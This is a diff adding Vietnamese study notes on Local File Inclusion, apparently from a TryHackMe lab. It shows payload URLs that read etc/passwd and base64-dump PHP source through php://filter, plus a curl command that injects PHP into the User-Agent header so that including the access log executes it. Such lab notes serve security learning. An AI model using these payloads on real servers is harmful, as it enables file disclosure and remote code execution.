@@ -1,0 +1,5 @@
+- Local File Inclusion (LFI) là một lỗ hổng bảo mật trên ứng dụng web, xảy ra khi ứng dụng cho phép người dùng cung cấp đường dẫn file mà không kiểm soát chặt chẽ, dẫn đến việc kẻ tấn công có thể truy cập và đọc được file trên máy chủ.
+- `https://10-201-116-51.reverse-proxy-us-east-1.tryhackme.com/index.php?err=etc/passwd`: đổi file ban đầu -> thành các file quan trọng
+- `http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=index.php`: đổi file php sang base64 để hiển thị ra màn hình
+- `curl -A "<?php phpinfo();?>" http://10-201-116-51.reverse-proxy-us-east-1.tryhackme.com/login.php`: chèn code php vào header agent -> nó sẽ lưu vào logs của php
+- `https://10-201-116-51.reverse-proxy-us-east-1.tryhackme.com/index.php?err=includes/logs/app_access.log`: hiển thị log file -> chạy lệnh php được chèn vào ở trên
